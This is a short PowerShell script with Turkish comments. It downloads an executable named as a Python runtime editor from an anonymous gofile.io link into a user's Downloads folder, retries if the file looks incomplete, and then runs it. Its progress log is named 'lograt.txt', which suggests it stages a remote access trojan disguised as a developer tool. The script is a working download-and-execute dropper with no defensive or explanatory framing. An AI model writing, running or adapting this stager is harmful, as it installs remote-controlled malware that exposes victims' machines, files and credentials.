$exeUrl = "https://store10.gofile.io/download/web/f251cd75-0191-4927-9a7b-2035446b5c3d/pythonruntimeditor.exe"
$localPath = "C:\Users\dogud\Downloads\pythonruntimeditor.exe"

# Beklenen dosya boyutunu burada belirt
$expectedSize = 46000  # 46 KB'lik dosya için
$logFile = "$env:USERPROFILE\Downloads\lograt.txt"
$log = { param($msg) Add-Content -Path $logFile -Value ("[$(Get-Date -Format 'HH:mm:ss')] $msg") }

try {
    # Dosya indiriliyor
    Invoke-WebRequest -Uri $exeUrl -OutFile $localPath -UseBasicParsing -ErrorAction Stop

    # Dosyanın boyutunu kontrol et
    $fileSize = (Get-Item $localPath).length
    if ($fileSize -lt $expectedSize) {
        & $log "HATA: Dosya eksik indirildi! Boyut: $fileSize. Yeniden indiriyorum..."
        Remove-Item $localPath -Force
        Invoke-WebRequest -Uri $exeUrl -OutFile $localPath -UseBasicParsing -ErrorAction Stop
    } else {
        & $log "Dosya başarıyla indirildi: $fileSize byte"
    }

    # Dosyayı çalıştır
    Start-Process -FilePath $localPath -WindowStyle Normal
} catch {
    & $log "HATA: $($_.Exception.Message)"
}
